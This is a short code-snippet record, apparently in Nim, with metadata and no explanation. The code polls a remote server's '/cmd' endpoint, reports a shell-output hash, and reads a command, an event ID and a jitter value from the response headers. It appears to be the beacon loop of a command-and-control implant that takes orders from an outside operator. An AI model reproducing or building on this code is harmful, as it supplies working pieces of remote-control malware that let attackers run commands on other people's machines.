---
id: ffc8b3e8-e7a3-4f1f-802c-0d162685bb1e
type: code
language: ''
verified: false
created_at: '2023-06-06T03:12:18.069895+00:00'
updated_at: '2023-06-06T03:12:44.566347+00:00'
---

# Code Snippet ffc8b3e8

```
var GetCommand = newHttpClient(userAgent= defUserAgent)
GetCommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = GetCommand.request(server & "/cmd", httpMethod = HttpGet)
#echo sent.status
let response = sent.headers
let cmd = response.getOrDefault("X-cmd") # Check for Command
let event_id = response.getOrDefault("x-event-id") # Check for event ID
let jitter = response.getOrDefault("x-jitter")
```
